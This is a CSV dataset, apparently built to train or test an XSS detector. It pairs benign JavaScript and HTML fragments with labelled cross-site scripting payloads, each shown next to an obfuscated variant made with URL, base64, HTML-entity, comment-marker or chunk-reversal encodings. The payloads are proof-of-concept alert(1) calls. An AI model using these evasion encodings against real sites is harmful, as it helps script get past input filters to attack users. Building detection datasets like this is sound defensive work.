sample_id,label,payload_original,payload_obfuscated,generator,recipe
2388,0,_gettipelement() { if (!this.tip) { this.tip = this._createtipelement(this._newcontent || this._getcontentfortemplate());,_gettipelement() { if (!this.tip) { this.tip = this._createtipelement(this._newcontent || this._getcontentfortemplate());,llm_style_t1.0,none
2389,0,} element.classlist.add(class_name_show$5); this._emulateanimation(() => {,} element.classlist.add(class_name_show$5); this._emulateanimation(() => {,llm_style_t1.0,none
2390,1,<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,<pre onblur=alert(1)  tabindex=1 id=x></pre><input autofocus>,llm_style_t1.0,whitespace_noise
2391,0,"this.$ambtn = $('<div class=""am-btn"">am</div>'); this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);","this.$ambtn = $('<div class=""am-btn"">am</div>'); this.$pmbtn = $('<div class=""pm-btn"">pm</div>'); this.$ambtn.on('click', this._handleampmclick.bind(this)).appendto(this.spanampm);",llm_style_t1.0,none
2392,0,for (const anchor of targetlinks) { if (!anchor.hash || isdisabled(anchor)) { continue,for (const anchor of targetlinks) { if (!anchor.hash || isdisabled(anchor)) { continue,llm_style_t1.0,none
2393,0,"selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active)","selectorengine.findone(selector_dropdown_toggle, target.closest(selector_dropdown)).classlist.add(class_name_active)",llm_style_t1.0,none
2394,0,var $collapsiblelis = $collapsible.children('li'); var isactive = $collapsibleli[0].classlist.contains('active'); var index = $collapsiblelis.index($collapsibleli);,var $collapsiblelis = $collapsible.children('li'); var isactive = $collapsibleli[0].classlist.contains('active'); var index = $collapsiblelis.index($collapsibleli);,llm_style_t1.0,none
2395,0,cleartimeout(this._exitdelaytimeout),cleartimeout(this._exitdelaytimeout),llm_style_t1.0,none
2396,0,} } sidenav._sidenavs = [];,} } sidenav._sidenavs = [];,llm_style_t1.0,none
2397,1,<header onpointerout=alert(1)>xss</header>,%3Cheader%20onpointerout%3Dalert%281%29%3Exss%3C%2Fheader%3E,llm_style_t1.0,urlencode+whitespace_noise
2398,0,"this.el.addeventlistener('blur', chips._handlechipsblur, true)","this.el.addeventlistener('blur', chips._handlechipsblur, true)",llm_style_t1.0,none
2399,0,"<li><a href=""/wiki/computational_mathematics"" title=""computational mathematics"">computational mathematics </a> </li>","<li><a href=""/wiki/computational_mathematics"" title=""computational mathematics"">computational mathematics </a> </li>",llm_style_t1.0,none
2400,1,"<noscript onmousemove=""alert(1)"">test</noscript>","<noscript onmouse/*OBF*/move=""alert(1)"">test</noscript>",llm_style_t1.0,comment_marker
2401,1,<br onpointerover=alert(1)>xss</br>,&lt; br onpointerover=alert(1)&gt;xss&lt;/br&gt;,llm_style_t1.0,html_entities+whitespace_noise
2402,0,import alert from './src/alert.js' import button from './src/button.js' import carousel from './src/carousel.js',import alert from './src/alert.js' import button from './src/button.js' import carousel from './src/carousel.js',llm_style_t1.0,none
2403,0,_this62._scroll(_this62.offset),_this62._scroll(_this62.offset),llm_style_t1.0,none
2404,0,"const preventoverflow$1 = { name: 'preventoverflow', enabled: true,","const preventoverflow$1 = { name: 'preventoverflow', enabled: true,",llm_style_t1.0,none
2405,0,document.body.style.overflow = '',document.body.style.overflow = '',llm_style_t1.0,none
2406,0,return; } this.el.m_formselect = this;,return; } this.el.m_formselect = this;,llm_style_t1.0,none
2407,0,"'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow') );","'initialoverflow', $card.css('overflow') === undefined ? '' : $card.css('overflow') );",llm_style_t1.0,none
2408,1,<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>,&lt;textarea id=x tabindex=1 onbeforeactivate=alert(1)&gt;&lt;/textarea&gt;,llm_style_t1.0,html_entities
2409,0,}; m.getdocumentscrollleft = function () { return window.pagexoffset || document.documentelement.scrollleft || document.body.scrollleft || 0;,}; m.getdocumentscrollleft = function () { return window.pagexoffset || document.documentelement.scrollleft || document.body.scrollleft || 0;,llm_style_t1.0,none
2410,1,"<nav onbeforecopy=""alert(1)"" contenteditable>test</nav>",PG5hdiBvbmJlZm9yZWNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvbmF2Pg==,llm_style_t1.0,base64+html_entities
2411,0,"'js/modal.js', 'js/materialbox.js', 'js/parallax.js',","'js/modal.js', 'js/materialbox.js', 'js/parallax.js',",llm_style_t1.0,none
2412,0,let ins = classdef.getinstance(el); if (!!ins) { ins.destroy();,let ins = classdef.getinstance(el); if (!!ins) { ins.destroy();,llm_style_t1.0,none
2413,0,} _move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 : event.touches[0].clientx - this._deltax;,} _move(event) { this._deltax = event.touches && event.touches.length > 1 ? 0 : event.touches[0].clientx - this._deltax;,llm_style_t1.0,none
2414,0,carousel.getorcreateinstance(carousel) } }),carousel.getorcreateinstance(carousel) } }),llm_style_t1.0,none
2415,1,"<big draggable=""true"" ondragleave=""alert(1)"">test</big>","<big draggable=""true"" ondragleave=""alert( 1)"">test</big>",llm_style_t1.0,whitespace_noise
2416,1,"<style>@keyframes slidein {}</style><table style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></table>",%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Ctable%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onanimationiteration%3D%22alert%281%29%22%3E%3C%2Ftable%3E,llm_style_t1.0,urlencode
2417,1,"<style>:target {color:red;}</style><link id=x style=""transition:color 1s"" ontransitionend=alert(1)></link>",%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2F%20%20style%3E%3Clink%20id%3Dx%20style%3D%22transition%3Acolor%201s%22%20ontransitionend%3D%20alert%28%20%201%29%3E%3C%2F%20link%3E,llm_style_t1.0,whitespace_noise+urlencode
2418,0,"throw new error(""nouislider: 'limit', 'margin' and 'padding' must be divisible by step.""); } return this.xpct.length === 2 ? frompercentage(this.xval, value) : false;","throw new error(""nouislider: 'limit', 'margin' and 'padding' must be divisible by step.""); } return this.xpct.length === 2 ? frompercentage(this.xval, value) : false;",llm_style_t1.0,none
2419,0,_this62.showindicators = _this62.options.indicators && _this62.hasmultipleslides; _this62.nowrap = _this62.options.nowrap || !_this62.hasmultipleslides; _this62.pressed = false;,_this62.showindicators = _this62.options.indicators && _this62.hasmultipleslides; _this62.nowrap = _this62.options.nowrap || !_this62.hasmultipleslides; _this62.pressed = false;,llm_style_t1.0,none
2420,1,<main id=x tabindex=1 onfocus=alert(1)></main>,%3Cmain%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fmain%3E,llm_style_t1.0,urlencode
2421,0,$('body').append(hiddendiv),$('body').append(hiddendiv),llm_style_t1.0,none
2422,0,"</span> <span class=""toctext"">audit","</span> <span class=""toctext"">audit",llm_style_t1.0,none
2423,1,"<a href=""javas cript:alert(1)"">xss</a>",PGEgaHJlZj0iamF2YXMgY3JpcHQ6YWxlcnQoMSkiPnhzczwvYT4=,llm_style_t1.0,base64
2424,0,object.removeclass('invalid'); } } else {,object.removeclass('invalid'); } } else {,llm_style_t1.0,none
2425,1,"<button draggable=""true"" ondrag=""alert(1)"">test</button>",%26lt%3Bbutton%20draggable%3D%26quot%3Btrue%26quot%3B%20ondrag%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fbutton%26gt%3B,llm_style_t1.0,html_then_urlencode+html_entities
2426,0,"} _this28._animatein(); }, this.options.enterdelay);","} _this28._animatein(); }, this.options.enterdelay);",llm_style_t1.0,none
2427,0,_this62.count = _this62.images.length,_this62.count = _this62.images.length,llm_style_t1.0,none
2428,1,<ruby onpointerdown=alert(1)>xss</ruby>,<r/*OBF*/uby onpointerdown=alert(1)>xss</ruby>,llm_style_t1.0,comment_marker
2429,0,"var y = clickpos.y - this.y0; if (this.moved && x === this.dx && y === this.dy) { this.sethand(x, y);","var y = clickpos.y - this.y0; if (this.moved && x === this.dx && y === this.dy) { this.sethand(x, y);",llm_style_t1.0,none
2430,0,"index_js.executeaftertransition(callback, this._getelement(), this._config.isanimated)","index_js.executeaftertransition(callback, this._getelement(), this._config.isanimated)",llm_style_t1.0,none
2431,1,<footer id=x tabindex=1 onbeforedeactivate=alert(1)></footer><input autofocus>,>tofocusnput auoter><i1)></fo=alert(ctivateforedea=1 onbeabindex id=x t<footer,llm_style_t1.0,reverse_chunks
2432,0,"} function removenamespacedhandlers(element, events, typeevent, namespace) { const storeelementevent = events[typeevent] || {}","} function removenamespacedhandlers(element, events, typeevent, namespace) { const storeelementevent = events[typeevent] || {}",llm_style_t1.0,none
2433,0,$(this.thumb).addclass('thumb'); $(this.value).addclass('value'); $(this.thumb).append(this.value);,$(this.thumb).addclass('thumb'); $(this.value).addclass('value'); $(this.thumb).append(this.value);,llm_style_t1.0,none
2434,1,"<hgroup onmouseout=""alert(1)"">test</hgroup>",%3Chgroup%20onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,llm_style_t1.0,urlencode
2435,0,if (foundnewindex) {,if (foundnewindex) {,llm_style_t1.0,none
2436,1,"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48eHNzIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC94c3M+,llm_style_t1.0,base64+whitespace_noise
2437,1,"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",%3Cprogress%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fprogress%3E,llm_style_t1.0,urlencode
2438,0,"'-moz-transition-duration': effect.duration + 'ms',","'-moz-transition-duration': effect.duration + 'ms',",llm_style_t1.0,none
2439,1,"<div draggable=""true"" contenteditable>drag me</div><textarea ondrop=alert(1) contenteditable>drop here</textarea>",%253Cdiv%2520draggable%253D%2522true%2522%2520contenteditable%253Edrag%2520me%253C/*OBF*/%252Fdiv%253E%253Ctextarea%2520ondrop%253Dalert%25281%2529%2520co/*OBF*/ntenteditable%253Edrop%2520here%253C/*OBF*/%252F/*OBF*/t/*OBF*/extarea%253E,llm_style_t1.0,double_urlencode+comment_marker
2440,0,"return e ? e : function () { return $jscomp.iteratorfromarray(this, function (e) { return e;","return e ? e : function () { return $jscomp.iteratorfromarray(this, function (e) { return e;",llm_style_t1.0,none
2441,0,isnumeric: function (n) {,isnumeric: function (n) {,llm_style_t1.0,none
2442,0,if (touchhandler.allowevent(e) === false) { return null; },if (touchhandler.allowevent(e) === false) { return null; },llm_style_t1.0,none
2443,0,"<h3><span class=""mw-headline"" id=""learning"">learning","<h3><span class=""mw-headline"" id=""learning"">learning",llm_style_t1.0,none
2444,1,"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",%26lt%3Bmulticol%20draggable%3D%26quot%3Btrue%26quot%3B%20ondragstart%3D%26quot%3Balert%281%29%26quot%3B%26gt%3Btest%26lt%3B%2Fmulticol%26gt%3B,llm_style_t1.0,html_then_urlencode
2445,1,<track id=x tabindex=1 onfocusin=alert(1)></track>,%2526lt%253Btrack%2520id%253Dx%2520tabindex%253D1%2520onfocusin%253Dalert%25281%2529%2526gt%253B%2526lt%253B%252Ftrack%2526gt%253B,llm_style_t1.0,html_entities+double_urlencode
2446,0,var min = paddingobject[minprop],var min = paddingobject[minprop],llm_style_t1.0,none
2447,0,if (!elementstyle) {,if (!elementstyle) {,llm_style_t1.0,none
2448,0,"if (h.dom(a) && u(w, c)) return ""transform"";if (h.dom(a) && (a.getattribute(c) || h.svg(a) && a[c])) return ""attribute"";if (h.dom(a) && ""transform"" !== c && e(a, c)) return ""css"";if (null != a[c]) return ""object""; }function x(a, c) { var d = v(c),","if (h.dom(a) && u(w, c)) return ""transform"";if (h.dom(a) && (a.getattribute(c) || h.svg(a) && a[c])) return ""attribute"";if (h.dom(a) && ""transform"" !== c && e(a, c)) return ""css"";if (null != a[c]) return ""object""; }function x(a, c) { var d = v(c),",llm_style_t1.0,none
2449,1,"<summary onclick=""alert(1)"">test</summary>",%3Csummary%20onclick%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,llm_style_t1.0,urlencode
2450,1,<article onpointerover=alert(1)>xss</article>,%26lt%3Barticle%20onpointerover%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Farticle%26gt%3B,llm_style_t1.0,html_then_urlencode
2451,1,"<svg><script href=""data:text/javascript,alert(1)"" />","<svg> <script href/*OBF*/=""da/*OBF*/ta:text/javascript,alert(1)"" />",llm_style_t1.0,comment_marker+whitespace_noise
2452,1,<caption onpointermove=alert(1)>xss</caption>,%252526lt%25253Bcaption%252520onpointermove%25253Dalert%2525281%252529%252526gt%25253Bxss%252526lt%25253B%25252Fcaption%252526gt%25253B,llm_style_t1.0,html_then_urlencode+double_urlencode
2453,0,"title: 'navbar', body: 'the navbar is fully contained by an html5 nav tag. inside a recommended container div, there are 2 main parts of the navbar. a logo or brand link, and the navigations links. you can align these links to the left or right.' });","title: 'navbar', body: 'the navbar is fully contained by an html5 nav tag. inside a recommended container div, there are 2 main parts of the navbar. a logo or brand link, and the navigations links. you can align these links to the left or right.' });",llm_style_t1.0,none
2454,0,const event_key = `.${data_key}` const data_api_key = '.data-api' const class_name_active = 'active',const event_key = `.${data_key}` const data_api_key = '.data-api' const class_name_active = 'active',llm_style_t1.0,none
2455,0,"<p>in the 1940s and 1950s, a number of researchers explored the connection between <a href=""/wiki/neurobiology"" class=""mw-redirect"" title=""neurobiology"">neurobiology </a>, <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and <a href=""/wiki/cybernetics"" title=""cybernetics"">cybernetics </a>. some of them built machines that used electronic networks to exhibit rudimentary intelligence, such as <a href=""/wiki/w._grey_walter"" class=""mw-redirect"" title=""w. grey walter"">w. grey walter </a>'s <a href=""/wiki/turtle_(robot)"" title=""turtle (robot)"">turtles </a> and the <a href=""/wiki/johns_hopkins_beast"" title=""johns hopkins beast"">johns hopkins beast </a>. many of these researchers gathered for meetings of the teleological society at <a href=""/wiki/princeton_university"" title=""princeton university"">princeton university </a> and the <a href=""/wiki/ratio_club"" title=""ratio club"">ratio club </a> in england.<sup id=""cite_ref-ai&#39;s_immediate_precursors_156-0"" class=""reference""><a href=""#cite_note-ai&#39;s_immediate_precursors-156"">&#91;153&#93; </a> </sup> by 1960, this approach was largely abandoned, although elements of it would be revived in the 1980s.","<p>in the 1940s and 1950s, a number of researchers explored the connection between <a href=""/wiki/neurobiology"" class=""mw-redirect"" title=""neurobiology"">neurobiology </a>, <a href=""/wiki/information_theory"" title=""information theory"">information theory </a>, and <a href=""/wiki/cybernetics"" title=""cybernetics"">cybernetics </a>. some of them built machines that used electronic networks to exhibit rudimentary intelligence, such as <a href=""/wiki/w._grey_walter"" class=""mw-redirect"" title=""w. grey walter"">w. grey walter </a>'s <a href=""/wiki/turtle_(robot)"" title=""turtle (robot)"">turtles </a> and the <a href=""/wiki/johns_hopkins_beast"" title=""johns hopkins beast"">johns hopkins beast </a>. many of these researchers gathered for meetings of the teleological society at <a href=""/wiki/princeton_university"" title=""princeton university"">princeton university </a> and the <a href=""/wiki/ratio_club"" title=""ratio club"">ratio club </a> in england.<sup id=""cite_ref-ai&#39;s_immediate_precursors_156-0"" class=""reference""><a href=""#cite_note-ai&#39;s_immediate_precursors-156"">&#91;153&#93; </a> </sup> by 1960, this approach was largely abandoned, although elements of it would be revived in the 1980s.",llm_style_t1.0,none
2456,1,"<html onpaste=""alert(1)"" contenteditable>test</html>",%26lt%3Bhtml%20onpaste%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fhtml%26gt%3B,llm_style_t1.0,html_then_urlencode+html_entities
2457,0,this.formats = { d: () => { return this.date.getdate();,this.formats = { d: () => { return this.date.getdate();,llm_style_t1.0,none
2458,1,<audio onpointerdown=alert(1)>xss</audio>,PGF1ZGlvIG9ucG9pbnRlcmRvd249YWxlcnQoMSk+eHNzPC9hdWRpbz4=,llm_style_t1.0,base64
2459,0,if ( value >= 100 ){ return xval.slice(-1)[0]; },if ( value >= 100 ){ return xval.slice(-1)[0]; },llm_style_t1.0,none
2460,1,"<style>:target {transform: rotate(180deg);}</style><noframes id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></noframes>","<style>:target {transform/*OBF*/: rotate(180deg);}</style/*OBF*/><noframes id=x style=""transition:transfor/*OBF*/m 2s"" ontransitionrun=a/*OBF*/lert(1)></noframes>",llm_style_t1.0,comment_marker
